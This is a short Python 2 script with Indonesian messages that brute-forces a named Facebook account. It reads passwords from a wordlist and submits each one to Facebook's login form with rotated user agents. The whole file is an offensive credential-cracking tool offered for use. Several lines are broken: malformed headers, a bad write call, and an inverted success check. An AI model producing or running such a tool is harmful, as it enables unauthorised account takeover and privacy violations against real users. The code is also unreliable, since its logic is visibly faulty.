import os, sys, time, random, cookielib, mechanize


email = str(raw_input('Username Target: '))
passw_list = str(raw_input('File Wordlist: '))

login = 'https://www.facebook.com/login.php?login_attempt=1'

user_agent = [
              'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
              'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck'
              ]

def main():
        global mb, passw1
        mb = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        mb.set_handle_robots(False)
        mb.set_handle_redirect(True)
        mb.set_cookiejar(cj)
        mb.set_handle_equiv(True)
        mb.set_handle_referer(True)
        mb.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        passw = open(passw_list, 'r')
        for passw1 in passw:
                passw = passw1.replace('\n', '')
                runn(passw1)

def runn(passw1):
        jumlah = open(passw_list, 'r').readlines()
        print " Jumlah PAssword Saat ini", len(jumlah),"password"
        print " Sedang Crack Akun {}".format(email)
        it = 1;
        sys.stdout.write("\n Mencoba.....{}","{}".format(it).format(passw1))
        it += 1
        sys.stdout.flush()
        mb.addheaders = ['User-agent', random.choice(user_agent), 'proxy', random]
        site = mb.open(login)
        mb.select_form(nr=0)
        mb.form ['email'] = email
        mb.form ['pass'] = passw1
        sub = mb.submit()
        dev = sub.geturl()
        if dev != login or 'login_attempt' in dev:
                print " Password Find...{}".format(passw1)

